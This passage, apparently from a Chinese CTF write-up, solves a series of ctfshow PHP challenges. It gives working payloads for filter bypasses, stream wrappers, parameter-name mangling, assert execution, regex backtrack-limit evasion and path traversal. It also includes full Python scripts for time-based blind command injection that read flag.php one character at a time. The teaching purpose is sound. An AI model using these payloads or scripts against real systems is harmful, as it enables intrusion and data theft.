    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){  
            die("error v1");  
    }  
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){  
            die("error v2");  
    }  
    eval("echo new $v1($v2());");  
}  
?>
```
在原有的基础上，增加了非常强的筛子，首先虽然我们可以用比如 `v1=Exception&v2=phpinfo` 这样的内容来打，但是显然作者并不想在 phpinfo 里面放 flag，真的flag肯定还躺在原来的地方，当然我们应该是访问不到的，名字肯定是改了，因为我们注意到，如果真的和上道题的格式一样的话，我们是可以直接访问 `.txt` 后缀的文件的...

也就是，我们只需要找到一个方法得到这个文件的名字是什么就行了

当然这道题我们和上道题大致的逻辑是一样的，只不过，我们这里会介绍一个新的类，新的函数，来帮助我们获取文件名

| 部分                            | 作用                                      |
| ----------------------------- | --------------------------------------- |
| `getcwd()`                    | 返回当前工作目录，一般都是 /var/www/html             |
| `new FilesystemIterator(...)` | 用这个目录创建一个目录迭代器                          |
| `echo`                        | 迭代器被当字符串时，`__toString` 返回当前条目（第一个文件）的名字 |
也就是我们把这两个函数组合起来，就可以找到第一个文件的名字

当然这边也具体解释一下 FilesystemIterator 函数，它是目录迭代器的一种，可以指向一个文件或一个子目录（游标默认指向第一个），这边介绍两个目录迭代器

| 类                    | 特点                                |
| -------------------- | --------------------------------- |
| `DirectoryIterator`  | 包含 `.` 和 `..`，所以 echo 出来的是 `.`    |
| `FilesystemIterator` | 默认 `SKIP_DOTS`，所以 echo 出来是第一个真实文件 |
之所以只能echo 出一个文件是因为游标只对着当前的文件或者子目录，所以这道题想必不用写 payload 了吧


### pt.3.7

何意味
```php
highlight_file(__FILE__);  
error_reporting(0);  
include("flag.php");  
  
function getFlag(&$v1,&$v2){  
    eval("$$v1 = &$$v2;");
    var_dump($$v1);  
}  
  
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];  
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){  
            die("error v1");  
    }  
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){  
            die("error v2");  
    }  
      
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);  
    }  
}  
?>
```

先不看function，很容易理解，v1必须包含ctfshow，v1v2不能是上面那些过滤的内容

我们再来看这个函数 `getflag(&$v1,&$v2)` ，这里面的变量赋值会在 eval 之前做，也就是执行的代码就是 `$变量名A = &$变量名B;` 而这里面有一部分我们不是很理解，就是这个 `= &` 是什么——它是引用赋值，就是给变量多加一个别名，和正常的赋值不一样，引用赋值了之后，只要当一个变量里面的数据发生了改变的时候，这两个变量的值都会发生改变，那么我们比如 `var_dump($ctfshow)` 的时候实际上返回的时候是我们填入的 v2 的变量名。这里我们先好好解释一下 var_dump 这个函数

`var_dump` 函数本身接收一个或多个任意类型的变量，输出变量的类型+值
比如你输入 `var_dump(3)` 输出 `int(3)` ，输入 `var_dump(true)` 输出 `bool(true)` ，输入 `var_dump([1, 'a' => 'b']);` ，输出 ` array(2) {[0]=> int(1) ["a"]=> string(1) "b"}`

那我们虽然知道 flag 的变量名字，但是我们访问 `?v1=ctfshow&v2=flag` 的时候，返回的是NULL，这说明了flag不在当前环境下，可能在比如这个函数之外，那有没有全局变量呢能让我们把所有变量都访问到呢？其实是有的，只不过我们要区分，这个是 `超全局变量` 而不是 `全局变量` ，超全局变量是全局变量的一种，但是区别在于引擎给超全局变量打开了所有作用域可见的特权，也就是说这个变量自动在所有函数内都自带了 `global` ，在任何地方都能访问到

| 普通全局变量                    | 超全局变量                                                                                       |
| ------------------------- | ------------------------------------------------------------------------------------------- |
| `$flag`、`$config`、`$conn` | `$GLOBALS`、`$_GET`、`$_POST`、`$_SERVER`、`$_FILES`、`$_COOKIE`、`$_SESSION`、`$_REQUEST`、`$_ENV` |
而这里我们看到了一个 `$GLOBALS` 变量，它本身是超全局变量，可以在任何地方都能访问到，同时它本身是一个数组变量，里面存着所有全局变量，为什么这道题我们确定 `$flag` 是全局变量？因为前面有 `include("flag.php");` 在最外层，毫无疑问说明了 flag 是全局，所以打出来就很简单了


### pt.4.1

```php
highlight_file(__FILE__);  
error_reporting(0);  
function filter($file){  
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){  
        die("hacker!");  
    }else{  
        return $file;  
    }  
}  
$file=$_GET['file'];  
if(! is_file($file)){    highlight_file(filter($file));  
}else{  
    echo "hacker!";  
}
```
首先分析发现 `$file` 不能是纯文件名(  `(! is_file($file))`  )，其次它会过一遍filter，不能是以上的形式，那么很简单，我们只要 `file=php://filter/resource=flag.php` 用伪协议绕过就行了

### pt.4.2

```php
highlight_file(__FILE__);  
error_reporting(0);  
function filter($file){  
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){  
        die('hacker!');  
    }else{  
        return $file;  
    }  
}  
$file=$_GET['file'];  
if(! is_file($file)){    highlight_file(filter($file));  
}else{  
    echo "hacker!";  
}
```
刚刚的好像不给用了...
我们观察到了虽然很多都被ban了，但是 `file` 没有，于是我们进行一次尝试 `file=file:///var/www/html/flag.php` 发现返回了 `hacker!` 可是我们检查了一遍发现这里面并没有我们的限制的字符，那么问题肯定出在了 `is_file` 上，它把 `file` 的伪协议给真正识别成了 `file` ，为什么会这样？

我们这里要讲的就是 `is_file` 这个函数到底是通过什么判断出目标是不是文件的

**stat**调用，是 Unix 的一个系统调用，会问文件系统这个路径对应的东西是什么？是否存在？什么类型？多大？而php函数里面的很多有关file的函数，实际上底层都用到了stat的调用

|函数|实际做的事|
|---|---|
|`file_exists()`|stat 成功 = 存在|
|`is_file()`|stat 成功 **且** 类型是普通文件|
|`is_dir()`|stat 成功 **且** 类型是目录|
|`filesize()`|stat 拿 size|
|`stat()`|直接返回元数据数组|
这就是为什么我们不能直接输 `file=flag.php` 

而对于 PHP 伪协议来说，里面的流包装器是由很多个接口组成，比如 `stream_open()` 负责打开流，`stream_read()` 负责读取数据，而这里面有一个 `url_stat` ，是按路径查询元数据，做的就是stat的调用。而这里的关键就是：`url_stat` 这个流是可选项，也就是说有些伪协议里面是没有 `url_stat` 这个流的，对于没有stat状态的比较默认是 false，比如说 `php://filter` ，这也就是为什么刚刚的 `php://filter` 是可以过的。而对于我们的 `file://` 它则是含了 `url_stat` 的，而我们的目标又正好是文件，于是就被拦住了

这道题我们介绍另一个伪协议 `compress.zlib://<路径>`  它负责如果目标文件的开头是 `1F 8B` ，则当作 gzip 解压，否则把原始字节打出来，这也就是这道题可以绕过的地方


```php
error_reporting(0);  
highlight_file(__FILE__);  
function filter($file){  
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){  
        die('hacker!');  
    }else{  
        return $file;  
    }  
}  
$file=$_GET['file'];  
echo "师傅们居然tql都是非预期 哼！";  
if(! is_file($file)){    highlight_file(filter($file));  
}else{  
    echo "hacker!";  
}
```
就比如这个虽然ban了compress，但是把php://filter解封了直接出了


### pt.4.3

```php
include('flag.php');  
highlight_file(__FILE__);  
error_reporting(0);  
function filter($num){
    $num=str_replace("0x","1",$num);    
    $num=str_replace("0","1",$num);    
    $num=str_replace(".","1",$num);    
    $num=str_replace("e","1",$num);    
    $num=str_replace("+","1",$num);  
    return $num;  
}  
$num=$_GET['num'];  
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){  
    if($num=='36'){  
        echo $flag;  
    }else{  
        echo "hacker!!";  
    }  
}else{  
    echo "hacker!!!";  
}
```
这都啥啊？又是什么阴间的过滤
首先它得被认定为数字字符串，其次它不能是纯 `36` ，去掉空白 `trim()` 也不能等于 `36` ，最后替换之后还要宽松等于 36。也就是说，我们要一个表面不是36实际是36的36
但是这个filter又基本上把路都挡死了，所以我们只能钻空子。is_numeric() 判断前导空白的是 `空格、\t、\n、\v、\f、\r` ，而trim默认去的字符是 `空格 \t \n \r \v` 
所以这里我们只要 `%0c36` 就行了，非常简单


### pt.4.4

这是啥？
```php
error_reporting(0);  
highlight_file(__FILE__);  
include("flag.php");  
$a=$_SERVER['argv'];  
$c=$_POST['fun'];  
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){  
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){  
         eval("$c".";");    
         if($fl0g==="flag_give_me"){  
             echo $flag;  
         }  
    }  
}  
?>
```

首先我们要知道  `$a=$_SERVER['argv']` 和我们之前发的一个 `$_SERVER['HTTP_FLAG']` 是不一样的，后者是请求头，前者则是环境变量，它是通过URL查询串来发送的 也就是 `/?12345` (并非`/?12345=12345`) ，然后argv会以 `+` 为分隔符，随后变成数组，比如你输入了 `/?123+456=abc` ，那它就会是 `["123","456=abc"]` 这样的形式，当然在这道题我们显然发现这个 `$a` 自始至终都没有什么用...

于是我们把目光转向 `$c` 它让我们传一个fun，但是 eval的时候我们惊讶的发现它没怎么过滤，这个时候我们已经想好怎么打了

接下来POST里面还要有 `CTF_SHOW` 和 `CTF_SHOW.COM` 但是我们要注意，PHP参数名会将 `.` 变成 `_` ，但是在字符串遇到了 `[` 符号的时候，转换就会停止，而且在没有闭合 `]` 的情况下，PHP会把 `[` 变成 `_` ，那么这道题就很简单了

我想到了 `CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag` ，不知道你们有没有看出它的奇妙之处呢？没错！c 几乎没有限制，而且是 eval 这样的危险函数很容易就 echo 出来了，于是我们根本不需要管后面要怎么筛，直接出了


### pt.4.5

加强
```php
error_reporting(0);  
highlight_file(__FILE__);  
include("flag.php");  
$a=$_SERVER['argv'];  
$c=$_POST['fun'];  
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){  
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){  
         eval("$c".";");  
         if($fl0g==="flag_give_me"){  
             echo $flag;  
         }  
    }  
}  
?>
```

这道题我们过滤了echo，但是我们可以用 `fun=include($a[0])` 这样的办法绕过，是不是很神奇？当然 `a[0]` 则是我们URL 查询串的第一个数据，那里面填什么呢？其实我一开始最先想到的是 `flag.php` 但是出不来，原因也很简单，因为被当作 php 执行了，所以和之前一样，我们要给它编码再输出 

发 `/?php://filter/convert.base64-encode/resource=flag.php` 和 POST `CTF_SHOW=1&CTF[SHOW.COM=1&fun=include($a[0])` 就行了

而如果
```php
error_reporting(0);  
highlight_file(__FILE__);  
include("flag.php");  
$a=$_SERVER['argv'];  
$c=$_POST['fun'];  
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){  
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){  
         eval("$c".";");    
         if($fl0g==="flag_give_me"){  
             echo $flag;  
         }  
    }  
}
```
在原有的基础上，去掉了很多非预期解

所以我们真正来说，是怎么做的呢？
我们考虑到了 `assert` 函数， `assert()` 是断言函数，比如 `assert($condition)` 如果condition为真，就执行，否则报 `AssertionError` (当然也是可以继续执行的比如)
```php
try {
    assert($x > 0, 'x 必须是正数');
} catch (AssertionError $e) {
    echo $e->getMessage();
}
```
问题就在于，在 PHP 7及以前，它会把里面的字符串当 PHP 代码执行！也就是包含了 `eval` 的能力，那接下来就不多说了，原理还是和之前一样的

`/?$fl0g=flag_give_me` 和 POST `CTF_SHOW=1&CTF[SHOW.COM=1&fun=assert($a[0])` 即可


### pt.5.1

WAF?
```php
error_reporting(0);  
include("flag.php");  
highlight_file(__FILE__);  
$ctf_show = md5($flag);  
$url = $_SERVER['QUERY_STRING'];  
  
//特殊字符检测  
function waf($url){  
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){  
        return true;  
    }else{  
        return false;  
    }  
}  
  
if(waf($url)){  
    die("嗯哼？");  
}else{
    extract($_GET);  
}  
  
  
if($ctf_show==='ilove36d'){  
    echo $flag;  
}
```
好的我们不紧张，我们来看看这是个什么东西，我们最终需要得到的是 `$ctf_show===ilove36d` 强相等， `$url = $_SERVER['QUERY_STRING'];` 是初始的查询串，不解码，然后它会过一层waf，其实就是筛子，之后它就会 `extract($_GET)` 

`extract()` 会把数组的键名变成变量名，值变成变量值，导入到当前的作用域，所以这道题我们一开始的 `$url` 实际上是一个键值的数组，然后这个时候我们已经知道了，到了这一层的时候，我们要让 `$ctf_show` 这个变量变成 `ilove36d` 但是在前面的waf不让我们写 `_` ，那我们是怎么写的呢？

事实上根据之前我们提到的，我们构造了 `ctf%2Eshow=ilove36d` ，而这里的 `%2E` 则是 `.` 的 URL，在刚刚开始的时候，它保留了原有格式不解码，直到到了 `$_GET` 的时候，它会自动进入默认解析器，里面就可以URL解析，然后就会变成 `ctf.show=...` 接下来就会把里面的 `.` 变成 `_` ，在底层的 C 函数调用是这样的

```c
/* php_default_treat_data */
php_url_decode(var, strlen(var));          // 第 1 趟：%2E 变成 .
val_len = php_url_decode(val, strlen(val)); // 值也解码
php_register_variable_safe(var, val, ...);  // 交给下一层

/* php_register_variable_ex */
for (p = var; *p; p++) {
    if (*p == ' ' || *p == '.') {
        *p = '_';                           // 第 2 趟：. 变成 _
    }
}
```

这样就可以过了


然后是一个小知识，这里因为不常见了，所以作为讲解
```php
error_reporting(0);  
include("flag.php");  
highlight_file(__FILE__);  
  
$f1 = $_GET['f1'];  
$f2 = $_GET['f2'];  
  
if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));  
}else{  
    echo "嗯哼？";  
}  
  
function check($str){  
    return !preg_match('/[0-9]|[a-z]/i', $str);  
}
```
payload是 `/?f1=_&f2=get_defined_vars` 
这个 `_()` 是什么函数啊？其实是 PHP gettext 拓展的别名，等价于 `gettext()` ，这也太偏了，同时这个 `_` 也过了check，`call_user_func()` 的意思是把第一个参数作为函数，后面的参数作为该函数的参数，于是带入第一层就可以得到 `var_dump(call_user_func(_('get_defined_vars')))`，也就变成了 `var_dump(call_user_func('get_defined_vars'))` 就变成了 `var_dump(get_defined_vars())`，而 `get_defined_vars()` 则是返回当前作用域所有变量组成的数组，最后 var_dump 即可


### pt.5.2 路径穿越

这是什么
```php
error_reporting(0);  
highlight_file(__FILE__);  
if(isset($_GET['f'])){
    $f = $_GET['f'];  
    if(stripos($f, 'ctfshow')>0){  
        echo readfile($f);  
    }  
}
```
大概逻辑非常简单，然后我们只需要知道这个 `stripos` 是找子字符串第一次出现的位置，不分大小写。当然函数 `strpos` 是区分大小写的。如果没找到就会返回 `false` ，然后我们要做的就是让ctfshow这个字段出现在 `$f` 里面且不是第一个字符串，然后我们的目标是 `flag.php` ，这个 `readfile()` 的作用是读取文件的同时，返回读到的字符数，当然有趣的是，readfile 支持伪协议，因此我们也可以整一个很好玩的命令串，当然这道题不能这么用

所以真正解决这道题，我想到了一个方法：我们一定要访问到 flag.php 的同时，也要出现 ctfshow 这个字符串，但是实际上这个字符串并不出现在 flag.php 的相对或者绝对路径之下，那么解决办法就是利用 **路径穿越** ，比如我打了payload是 `?f=/var/www/html/ctfshow/../flag.php` ，我们用 `../` 来返回原路径，然后我们再访问 flag.php 就可以得到一举两得的效果

当然这里会存在一个问题就是，在 linux 环境下和 windows 环境下，对于这个 `ctfshow` 这个路径是否存在而导致能否穿越会有不同的结果，前者会导致报错，ctfshow这个路径一定要存在，而后者则不用考虑这个路径是否存在，无论是否存在都可以穿越，所以真正穿越的时候仍然要获取系统的类型，来帮助我们打不同的 payload

当然这道题利用刚刚的 payload 确实可以打出来，应该是windows环境（确信）


### pt.5.3

这不对吧
```php
error_reporting(0);  
highlight_file(__FILE__);  
include("flag.php");  
if(isset($_POST['f'])){
    $f = $_POST['f'];  
  
    if(preg_match('/.+?ctfshow/is', $f)){  
        die('bye!');  
    }  
    if(stripos($f, 'ctfshow') === FALSE){  
        die('bye!!');  
    }  
  
    echo $flag;  
  
}
```
这里唯一需要我们想一下的是这个正则是到底在查什么？ `.` 是任意一个字符 `+` 是出现一次及以上，`?` 是紧跟在量词后面，可以不用细究。 `i` 是不区分大小写， `s` 是让符号 `.` 也能匹配换行符。

所以它找的是， `ctfshow` 前面至少有一个字符的位置，如果这样成立，就会 die，那么很简单啊，我们让 ctfshow 放第一个好了，然后第二行更简单了，看完我们直接打出 `f=ctfshow` 结束。


### pt.5.4 回溯上限

kale
```php
error_reporting(0);  
highlight_file(__FILE__);  
include("flag.php");  
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];  
  
    if(preg_match('/.+?ctfshow/is', $f)){  
        die('bye!');  
    }  
    if(stripos($f,'36Dctfshow') === FALSE){  
        die('bye!!');  
    }  
  
    echo $flag;  
  
}
```
这里我们看到了，前后比较的不一致性，但是我们两个判断都要过，这怎么办呢？

我们做了这么多题了，了解了这么多的知识，其实心里面大致也对绕过有了一些了解。和一些经验也有关系吧，这道题就是这样：如果我们考虑输入非常长的字符串，会不会有一个函数会报错呢？

>`preg_match` 在超长输入上可能直接返回 `false`，而代码用 `if(preg_match(...))` 判断，`false` 被当成“不匹配”，过滤器就放行了。这就是回溯上限

关键就在这里，因为 `preg_match` 函数会返回三个值， `1` 代表找到了 `0` 代表没找到，`false` 代表匹配出错了，一般会是超过PCRE（正则）限制，0和false都是假的意思，所以我们如果不能出现0，那我们就让它出 false 就行，一般回溯步数的上限是1000000，超过就会报 false

我们用 python 来发
```python
import os
import requests

payload = 'a' * 1000000 + '36Dctfshow'

s = requests.Session()
s.trust_env = False

VERIFY = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'challenge_chain.pem')

r = s.post(
    'https://.../',
    data={'f': payload},
    timeout=30,
    verify=VERIFY,
)
print(r.status_code, len(r.text))
print(r.text)

```
即可

### pt.5.5 

幌子
```php
include("flag.php");  
highlight_file(__FILE__);  
  
if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];    
    $code = (String)$_GET['code'];  
  
    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){     
        if($code == 'admin'){  
            echo $flag;  
        }  
          
    }  
}
```
花了0.0001秒想出了payload `?code=admin&password=1&username=admin` ，如果你从一开始那篇看到现在也可以和我有一样的想法吧。

关键就在 与 的权重比 或 的权重要高，所以会先做与运算再做或运算，这道题就能解了


### pt.5.6 时间盲注

```php
error_reporting(0);  
highlight_file(__FILE__);  
//flag.php  
if($F = @$_GET['F']){  
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){  
        eval(substr($F,0,6));  
    }else{  
        die("6个字母都还不够呀?!");  
    }  
}
```
这里的 `substr($F,0,6)` 是截取 F 的前六个字符出来的意思，然后前面GET前有个 `@` 是屏蔽后面表达式产生的错误，这个可以不用管

关键就在于：我们要怎么构造这6个字符让它命令执行呢？其实并不太行，这里似乎命令执行不了，字符数太少了。那我们就要换一个思路，虽然它截取的是 F 的前六位，但是这并不妨碍 F 实际上可以写很多位，那可以这样试想：如果我们通过这六个字符调用了 F 变量它本身呢？eval 在执行的时候就会执行 F 的前六字符的命令，因为 `substr` 里面是截取了前六位，而这六位又是获取本身的字符，也就是类似 `eval($F)` 的效果 ，所以我们这里使用反引号来作为命令执行，在这里我们用 
```php
`$F`
```
这样来执行，等价于
```php
shell_exec($F)
```
而反引号还有一个好处就是先把F的值放进字符串，再把整个字符串当作命令，就比如说我们写
```php
/?F=`$F`;%0aecho 1;
```
它经过了substr之后就是
```php
eval(`$F`;)
```

然后我们这里需要捋清楚，这个整个逻辑是怎么样的，首先我们要区分 `eval` 是PHP 的命令执行，而 `shell_exec` 是 shell 的命令执行，二者的位置是不一样的。然后当 eval 看到了 \` ...\`  的时候，会先把 `...` 的先变量替换，然后再把结果放到 shell 里面，注意它只做变量替换（把 `$F` 变成我们GET进去的内容）和转义序列（比如 \n 就会作为换行）

所以这里要注意一点就是，变量替换是发生在 PHP 层的，而不是发生在 shell 层的，shell 只做它能做的事情，那至于能做什么？我们接着来讲

这个时候，做完了替换，把 $F 拿给了 shell 执行，`eval`函数的任务就算是完成了，也就是接下来的任务都会放在 shell 层去看

接下来就是
```shell
`$F`;\necho 1;
```
这里因为shell并没有PHP变量替换这样的功能，所以前面的 $F 就什么都不干，当作空命令了，所以最后得到的就是
```shell
echo 1;
```

到这里，我们终于进入了shell，并且执行了命令，但是我们在shell 里面执行的命令是看不到的，我们处于一个盲执行的状态，怎么让它回显到我们的页面上来呢？

其实我们可以尝试使用把返回的内容给重定向到一个具体文件上来，比如我们可以写 `echo A >1.txt` ，当然如果重定向失败的话，这句话就不会执行。我们怎么来看是否重定向成功了呢？很显然就是我们直接访问一下网页的这个 `1.txt` 即可，当然最终可以发现的是并没有访问到

这个时候我们就可以推断，没有写到的原因应该就是权限不足，而且因为 `error_reporting(0)` 导致我们看不到错误来源，所以页面上并不会出现 A ，但是我们访问 1.txt 的时候仍然是200，而且显示的是原来我们显示的内容

>这实际上也是一个小知识点：这是 Nginx 的兜底路由，当找不到路径的时候，在这个网页上就会返回到 index.php (其它网站视情况而定，但是一般都会返回到一开始的页面)

所以重定向读内容这条路也寄了（虽然我们可能可以写在 /tmp 这样的地方但是我们访问不到...），我们能用的都用了，那接下来要怎么办呢？

#### 时间侧信道
我们证明一个任务有没有执行，有一个办法就是观察这件事情做了多久，如果事件 A 执行时间为 0.1秒而事件B的执行时间为 3秒，那么很显然，后者执行了，而前者则是发现无法执行之后直接不执行了。

再举个例子，在之前的SRC过程中，我们如何在100个账号中找到唯一一个注册了的账号呢？我们把密码输成几百个字符长，然后爆破，我们比较他们执行的时间，如果它不是已经注册的账号，那么肯定在账号层就已经判死了，就不会花时间看那几百个字符的密码，而如果是注册的账号，才会去看几百个字符的密码，而看这个密码则是需要花非常久的时间（足以区分），假设账号层就判死的时间是0.5秒，那那个正确账号判死的时间则可能到5秒甚至更多——这就是 **时间侧信道**，通过时间来旁敲侧击出执行结果的成功与否，当然侧信道的方式不止时间这一种，我们这里先介绍这一个方法


所以我们接下来就是来讲解一下 **时间盲注** ，本质是把任意的布尔的条件变成可观测的耗时
我们的目标是 flag.php ，它是200没问题，但是因为被 PHP 执行了所以并没有输出，`$flag` 就在里面，我们要做的就是读它的文件

我们的payload是
```shell
`$F`;
c=$(grep -o "ctfshow{[^}]*}" /var/www/html/flag.php | cut -c9); 
n=$(expr index "0123456789abcdef-{}" "$c");
busybox usleep $((n*500000))
```
`当然shell里面的赋值是 c=$... ，取值是 $c...，这和PHP有区别需要注意`

拆开来讲，首先第二行是从 flag.php 里面 grep（搜索文件内容） `ctfshow{...}`，然后 `-o` 是只输出匹配部分，也就是最终的效果是 抠出了整个 `ctfshow{...}` 然后 `|` 是把左边的命令 stdout 接到右边的 stdin，也就是把flag字段作为cut的输入， `cut -c9` 是按字符选，取第九个字符

然后第三行 `expr index "STRING" "CHARS"` 就是返回STRING中第一个属于 CHARS 的字符的位置（1开始），如果找不到就返回 0 

而后面的 `busybox usleep N` 则是一个多合一工具集，我们调用了 `usleep` 是微秒（sleep是秒），也就是说，我们对应上了哪个字符，就会返回那个字符的位置×0.5秒，然后只要我们“去皮”，去掉正常操作需要的时间，留下来的就是对应的字符的时间

那我们既然找到了这个字符，我们就可以找下一个，把cut -c9 改成cut -c10，以此类推直到我们拿到了完整的flag，这就是时间盲注

我们的整个过程就是，先找基线，再循环测，返回的时间 - 基线 除以0.5，然后四舍五入得到位置，最后验证

搓出脚本，看不懂的自己喂给AI分析哼哼
```python
import time
import os
import requests

s = requests.Session()
url = "https://<题目实例地址>/"
payload1 = "`$F`;\nbusybox usleep 0"

HEAD = "`$F`;\n"
TAIL = ('c=$(grep -o "ctfshow{[^}]*}" /var/www/html/flag.php | cut -c%d);'
        ' n=$(expr index "0123456789abcdef-{}" "$c");'
        ' busybox usleep $((n*500000))')

step = 0.5
CHARSET = "0123456789abcdef-{}"
s.verify = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'challenge_chain.pem')

t0 = time.perf_counter()
resp = s.get(url, params={"F":payload1}, timeout=20)
dt = time.perf_counter() -t0
print(resp.status_code,round(dt, 3))


def measure_payload(p, s):
    t0 = time.perf_counter()
    s.get(url, params={"F": p}, timeout=30)
    return time.perf_counter() - t0

def measure(i, s):
    return measure_payload(HEAD + TAIL % i, s)

print("test:", s.get(url, params={"F": payload1}, timeout=20).status_code)

base = min(measure_payload(payload1, s) for _ in range(5))
print("base =", round(base, 3))

start = 9
flag = "ctfshow{"
while True:
    best = None
    for attempt in range(3):
        dt = measure(start, s)
        r = (dt - base) / step
        idx = int(r + 0.5)
        res = abs(r - idx)
        if res < 0.25 and 1 <= idx <= len(CHARSET):
            break
        if best is None or res < best[0]:
            best = (res, idx)
    else:
        idx = best[1]

    if idx < 1 or idx > len(CHARSET):
        print("Invalid idx ",idx,"t ",dt)
        raise SystemExit(1)

    ch = CHARSET[idx - 1]
    flag += ch
    print(start, idx, ch, flag, flush=True)
    if ch == "}" or start > 100:
        break
    start += 1
    time.sleep(0.3)
```
分析起来还是简单的，而且这里特意增加了一些抖动的容错

### pt.5.6 plus

加强
```php
error_reporting(0);  
highlight_file(__FILE__);  
//flag.php  
if($F = @$_GET['F']){  
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){  
        eval(substr($F,0,6));  
    }else{  
        die("师傅们居然破解了前面的，那就来一个加强版吧");  
    }  
}
```
虽然我们的payload里面 grep 可以用 gr''ep 绕过，然后ctfshow也同样可以，但是我们还是失败，我们有理由怀疑变量名是不是不是 `$flag` 于是我们用
```php
<条件> && sleep 2
```
看得懂吧，这个意思是如果前面成立则执行后者的意思
然后后面我们的测试根据返回的时间长短来判断真假

`test -f flag.php` 真 `grep -q "ctfshow{"` 真 但是 `grep -q "ctfshow.*}"` 假，说明flag似乎被拆成两段了...
然后变量名 `grep -q '$flag'` 真说明有这个字符串，但是 `grep -q '$flag[[:space:]]*='` 假，说明不是 `$flag =... ` 的形式，结合之前我们推测flag可能被拆成两段了我们推测可能是 `$flag1` `$flag2` ，用同样的方式测试发现为真，且没有 `$flag3` ，即确定有且仅有两段

那么我们的脚本其实只需要改一下就行了
```python
import time
import os
import requests

s = requests.Session()
url = "https://<题目实例地址>/"
payload1 = "`$F`;\n/usr/local/bin/php -r 'require \"/var/www/html/flag.php\"; $s=$flag1.$flag2; usleep(0);'"

HEAD = "`$F`;\n"
TAIL = ("/usr/local/bin/php -r 'require \"/var/www/html/flag.php\"; $s=$flag1.$flag2;"
        " usleep((strpos(\"0123456789abcdef-{}\",$s[%d])+1)*500000);'")

step = 0.5
CHARSET = "0123456789abcdef-{}"
s.verify = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'challenge_chain.pem')

t0 = time.perf_counter()
resp = s.get(url, params={"F":payload1}, timeout=20)
dt = time.perf_counter() -t0
print(resp.status_code,round(dt, 3))


def measure_payload(p, s):
    t0 = time.perf_counter()
    s.get(url, params={"F": p}, timeout=30)
    return time.perf_counter() - t0

def measure(i, s):
    return measure_payload(HEAD + TAIL % i, s)

print("test:", s.get(url, params={"F": payload1}, timeout=20).status_code)

base = min(measure_payload(payload1, s) for _ in range(5))
print("base =", round(base, 3))

start = 9
flag = "ctfshow{"
while True:
    best = None
    for attempt in range(3):
        dt = measure(start, s)
        r = (dt - base) / step
        idx = int(r + 0.5)
        res = abs(r - idx)
        if res < 0.25 and 1 <= idx <= len(CHARSET):
            break
        if best is None or res < best[0]:
            best = (res, idx)
    else:
        idx = best[1]

    if idx < 1 or idx > len(CHARSET):
        print("Invalid idx ",idx,"t ",dt)
        raise SystemExit(1)

    ch = CHARSET[idx - 1]
    flag += ch
    print(start, idx, ch, flag, flush=True)
    if ch == "}" or start > 100:
        break
    start += 1
    time.sleep(0.3)
```



### pt.6.1 变量覆盖

```php
highlight_file(__FILE__);  
$key1 = 0;  
$key2 = 0;  
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {  
    die("nonononono");  
}  
@parse_str($_SERVER['QUERY_STRING']);  
extract($_POST);  
if($key1 == '36d' && $key2 == '36d') {  
    die(file_get_contents('flag.php'));  
}
```
又不让 GET 又不让 POST？
我们看到它限制的实际上是GET和POST不能有 key1 和 key2 的键名，但没有限制我发的参数，那我们能不能想个办法让发送的时候键名不是 key1 key2 然后到最后检验的时候变成 key1 和 key2 呢？

我们看到了后面的两行
```php
@parse_str($_SERVER['QUERY_STRING']);  
extract($_POST); 
```
